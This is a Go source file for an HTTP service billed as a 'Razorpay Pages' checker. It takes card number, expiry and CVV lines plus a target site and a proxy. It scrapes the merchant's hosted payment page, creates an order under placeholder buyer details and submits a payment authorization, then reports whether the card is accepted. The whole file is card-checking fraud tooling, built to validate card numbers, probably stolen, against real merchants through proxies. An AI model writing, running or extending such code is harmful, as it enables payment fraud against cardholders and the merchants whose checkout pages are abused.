package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"
)

type APIResponse struct {
	CC       string `json:"cc"`
	Gateway  string `json:"Gateway"`
	Response string `json:"Response"`
	Price    string `json:"Price"`
	Currency string `json:"Currency"`
	Status   string `json:"Status"`
	Message  string `json:"Message"`
	Time     string `json:"Time"`
	Proxy    string `json:"Proxy"`
}

func main() {
	port := os.Getenv("RAZORPAY_PORT")
	if port == "" {
		port = "8086"
	}

	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"status":"ok","service":"razorpay-pages-checker"}`))
	})

	http.HandleFunc("/shopify", checkHandler) // mapped for backwards compatibility
	http.HandleFunc("/razorpay", checkHandler)

	fmt.Printf("======================================================================\n")
	fmt.Printf("  Razorpay Pages API Server\n")
	fmt.Printf("======================================================================\n")
	fmt.Printf("  Listening on http://0.0.0.0:%s\n\n", port)
	fmt.Printf("  Endpoint:\n")
	fmt.Printf("    GET /razorpay?cc=...&site=...&proxy=...&amount=...\n")
	fmt.Printf("======================================================================\n")

	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func checkHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	startTime := time.Now()
	ccLine := r.URL.Query().Get("cc")
	siteURL := r.URL.Query().Get("site")
	proxyURL := r.URL.Query().Get("proxy")
	amountStr := r.URL.Query().Get("amount")

	if ccLine == "" || siteURL == "" {
		w.WriteHeader(http.StatusBadRequest)
		_, _ = w.Write([]byte(`{"error":"Missing cc or site parameter"}`))
		return
	}

	// Default custom amount (INR)
	customAmount := 10
	if amountStr != "" {
		if val, err := strconv.Atoi(amountStr); err == nil && val > 0 {
			customAmount = val
		}
	}

	// Parse credit card details
	cardNo, expMonth, expYear, cvv, ok := parseCC(ccLine)
	if !ok {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "INVALID_CARD_DETAILS",
			Status:   "false",
			Message:  "Failed to parse credit card line",
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	// Initialize HTTP Client
	client, err := newClient(proxyURL, 15*time.Second)
	if err != nil {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "PROXY_ERROR",
			Status:   "false",
			Message:  fmt.Sprintf("Failed to initialize proxy client: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	session := &RazorpaySession{
		Client:       client,
		ProxyURL:     proxyURL,
		PageURL:      siteURL,
		CustomAmount: customAmount,
	}

	// Step 1: Scrape hosted page config
	if err := session.ScrapePage(); err != nil {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "NO_PRODUCT_FOUND",
			Status:   "false",
			Message:  fmt.Sprintf("Failed to extract page config: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	// Step 2: Create Order ID
	orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "9876543210")
	if err != nil {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "ORDER_FAILED",
			Status:   "false",
			Message:  fmt.Sprintf("Failed to create order: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	// Step 3: Submit Payment Authorization
	result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
	if err != nil {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "SUBMIT_FAILED",
			Status:   "false",
			Message:  fmt.Sprintf("Payment submission error: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	// Prepare API response
	status := "false"
	if result.Status == "success" || result.Status == "3ds" {
		status = "true"
	}

	resp := APIResponse{
		CC:       ccLine,
		Gateway:  "Razorpay Pages",
		Response: result.Response,
		Price:    formatAmount(session.ItemAmount),
		Currency: session.Currency,
		Status:   status,
		Message:  result.Message,
		Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:    getProxyLabel(proxyURL),
	}

	jsonResp, _ := json.Marshal(resp)
	_, _ = w.Write(jsonResp)
}

func getProxyLabel(proxyURL string) string {
	if proxyURL == "" {
		return "Direct"
	}
	return "Live"
}
